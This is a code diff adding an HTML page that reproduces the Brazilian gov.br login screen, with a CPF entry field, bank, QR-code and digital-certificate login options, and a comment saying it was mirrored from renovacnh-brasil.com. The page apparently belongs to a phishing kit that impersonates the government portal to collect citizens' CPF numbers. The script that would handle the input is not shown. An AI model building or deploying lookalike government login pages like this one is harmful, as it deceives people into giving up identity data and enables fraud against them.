@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>gov.br</title>
+
+    <link
+      rel="shortcut icon"
+      href="images/favicon.ico"
+      type="image/x-icon"
+    />
+
+    <!-- TailwindCSS CDN with custom font configuration -->
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://cdn.tailwindcss.com/"></script>
+
+    <!-- JS Script -->
+    <script defer src="script.js"></script>
+  </head>
+
+  <body class="font-sans">
+    <header class="flex px-4 bg-white h-16 items-center drop-shadow-md">
+      <a href="#">
+        <img
+          src="images/png/govbr-logo-large.png"
+          alt="gov.br"
+        />
+      </a>
+    </header>
+    <main class="w-screen flex flex justify-center h-full gap-20 mt-8">
+      <img
+        src="images/png/conta_govbr_v2.jpg"
+        class="h-fit hidden lg:block"
+        alt=""
+      />
+      <form class="bg-white rounded-sm p-4 drop-shadow-md">
+        <h1 class="font-semibold">Identifique-se no gov.br com:</h1>
+
+        <div class="flex items-center text-center pt-10 gap-3">
+          <img
+            src="images/png/id-card-solid.png"
+            class="h-4"
+            alt=""
+          />
+          <p class="text-sm">Número do CPF</p>
+        </div>
+
+        <div class="flex flex-col gap-2">
+          <h6 class="text-sm mt-3">
+            Digite seu CPF para <span class="font-semibold">criar</span> ou
+            <span class="font-semibold">acessar</span> sua conta gov.br
+          </h6>
+
+          <div class="mt-3 flex flex-col gap-1">
+            <h2 class="font-semibold text-sm">CPF</h2>
+            <input
+              id="cpf-input"
+              type="text"
+              class="border-[1px] rounded-md placeholder:text-xs placeholder:text-black/90 px-4 py-2 text-sm italic border-black/80 focus:bg-yellow-100"
+              placeholder="Digite seu CPF"
+              minlength="14" maxlength="14"
+              oninput="handleCPFInput(event)"
+            />
+
+            <!-- CPF deve ser informado. (ERL0000200) -->
+
+            <button
+              class="bg-[#1351b4] text-sm font-bold text-white py-3 rounded-full mt-7"
+            >
+              Continuar
+            </button>
+            <p class="cpf-error-message text-xs text-center" style="display: none;"></p>
+
+          </div>
+
+          <!-- Menu -->
+          <div class="font-semibold text-sm mt-7 flex flex-col gap-5">
+            <div class="border-b-[1px] border-black/50 pb-1">
+              <h3>Outras opções de identificação:</h3>
+            </div>
+
+            <a href="#" class="flex items-center gap-3">
+              <img
+                src="images/png/InternetBanking-green.png"
+                alt=""
+              />
+              <p class="flex items-center text-sm text-green-700">
+                Login com seu banco
+                <span
+                  class="ms-2 text-[10px] text-white bg-green-700 uppercase px-1"
+                  >Sua conta será prata</span
+                >
+              </p>
+            </a>
+
+            <a href="#" class="flex items-center gap-3 font-light">
+              <img src="images/png/qrcode.png" alt="" />
+              <p class="flex items-center text-sm">Login com QR code</p>
+            </a>
+
+            <a href="#" class="flex items-center gap-3 font-light">
+              <img src="images/png/CD.png" alt="" />
+              <p class="flex items-center text-sm">Seu certificado digital</p>
+            </a>
+
+            <a href="#" class="flex items-center gap-3 font-light">
+              <img src="images/png/CD-Nuvem.png" alt="" />
+              <p class="flex items-center text-sm">
+                Seu certificado digital em nuvem
+              </p>
+            </a>
+          </div>
+
+          <div
+            class="w-full flex flex-col pt-28 items-center gap-5 font-normal"
+          >
+            <a
+              href="#"
+              class="text-sm text-blue-800 mt-2 flex items-center gap-3"
+            >
+              <img
+                src="https://renovacnh-brasil.com/public/assets/images/svg/circle-question-solid.svg"
+                class="h-4"
+                alt=""
+              />
+              <p>Está com dúvidas e precisa de ajuda?</p>
+            </a>
+            <a href="#" class="text-sm text-blue-800"
+              >Termos de Uso e Aviso de Privacidade</a
+            >
+          </div>
+        </div>
+      </form>
+    </main>
+  </body>
+
+<!-- Mirrored from renovacnh-brasil.com/processo/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 18 Nov 2024 21:03:38 GMT -->
+</html>
